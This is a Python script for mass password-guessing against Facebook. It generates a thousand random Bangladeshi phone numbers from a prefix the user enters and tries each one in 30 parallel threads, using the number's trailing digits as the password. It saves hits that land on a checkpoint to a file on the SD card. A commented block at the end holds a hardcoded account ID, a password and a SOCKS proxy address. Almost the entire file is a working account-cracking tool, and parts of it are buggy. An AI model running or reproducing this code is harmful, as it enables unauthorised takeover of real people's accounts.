import mechanize,requests,random,string,sys,time
from concurrent.futures import ThreadPoolExecutor as tdp

cracked=0
cp=0
ok=0
invalid=0
def crack(num,ps):
    b= mechanize.Browser()
    b.set_handle_robots(False)
    b.set_handle_equiv(True)
    b.set_handle_gzip(True)
    b.set_handle_redirect(True)
    b.set_handle_referer(True)
    b.set_handle_robots(False)
    cj=mechanize.CookieJar()
    b.set_cookiejar(cj)
    b.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    #ua='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
    ua="Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"
    #ua="Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.0.1"
    b.addheaders=[('user-agent',ua)]
 

    fo=b.open("https://x.facebook.com")
    x=str(fo.read())
    #open("/sdcard/e.html","w").write(x[2:-1])
    b.addheaders=[('user-agent',ua),
('authority','x.facebook.com'),

            ('method', 'POST'),

            ('scheme','https'),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'),
            ('accept-encoding','gzip, deflate, br'),('accept-language', 'en-GB,en-US;q=0.9,en;q=0.8'),
            ('cache-control', 'max-age=0'),
            ('sec-ch-ua', '"Chromium";v="107", "Not=A?Brand";v="24"'),
            ('sec-ch-ua-mobile','?1'),('sec-ch-ua-platform', '"Android"')]
    def sub(nm,pas):
     global cracked,cp,ok,invalid
     while True:
        #prox={"https": "socks4://"+random.choice(ps)}
        try:
            
            b.select_form(nr=0)
            b.form.new_control('hidden', 'lsd',   {'value':b.form["lsd"]})
            b.form.new_control('hidden', 'jazoest',   {'value':b.form["jazoest"]})
            b.form.new_control('hidden', 'm_ts',   {'value':b.form["m_ts"]})
            b.form.new_control('hidden', 'li',   {'value':b.form["li"]})
            

            b.form["email"]=nm
            b.form["pass"]=ps
        
            rq=b.submit()
          
            if "checkpoint" in str(cj):
                print(f"\033[31mCP- {nm}  {pas}")
                cp+=1
                open("/sdcard/CP.txt","a").write(nm+"\t"+pas+"\n")
                break
            elif "c_user" in str(cj):
                print("OK " + nm+"\t"+pas)
                ok+=1
                print(cj)
            elif "Invalid username or password" in str(rq.read()): 
                #print("\033[1;34mErr "+nm)
                invalid+=1
                
            cracked+=1
            sys.stdout.write(f'\r[CRACKED-%s|1000] [Cp-%s] [Ok-%s] [Invalid-%s]'%(cracked,cp,ok,invalid))
            sys.stdout.flush()

        except Exception as e:
            print(e)
            sub(nm,pas)
        break
        
        
     
    sub(num,ps)

num=[]
print("Bangladeshi Random Number Cloning")
code=input("Code (017,0171,01733,etc): ")
for i in range(1000):
    x=''.join(random.choice(string.digits) for _ in range(11-len(code)))
    num.append(code+x)

print(num)

print(f"Cracking Random number with {code} prefix")
    
with tdp(max_workers=30) as e:
    for i in num:
        e.submit(crack,i,i[4:])
time.sleep(0.5)
print("\nEND")











"""open("/sdcard/e.html","w").write(x[2:-1])

b.set_proxies({'https': 'socks4://184.178.172.18:15280'})
#+random.choice(ps)}
b.select_form(nr=0)
b.form.new_control('hidden', 'lsd',   {'value':b.form["lsd"]})
b.form.new_control('hidden', 'jazoest',   {'value':b.form["jazoest"]})
b.form.new_control('hidden', 'm_ts',   {'value':b.form["m_ts"]})
b.form.new_control('hidden', 'li',   {'value':b.form["li"]})

b.form.new_control('hidden', 'try_number',   {'value':'0'})
b.form.new_control('hidden', 'unrecognized_tries',   {'value':'0'})

b.form["email"]="100009171717810"
b.form["pass"]="5364005"
b.form.new_control('hidden', 'login',   {'value':'Log In'})
r=b.submit()
print(r.read())
print(cj)
"""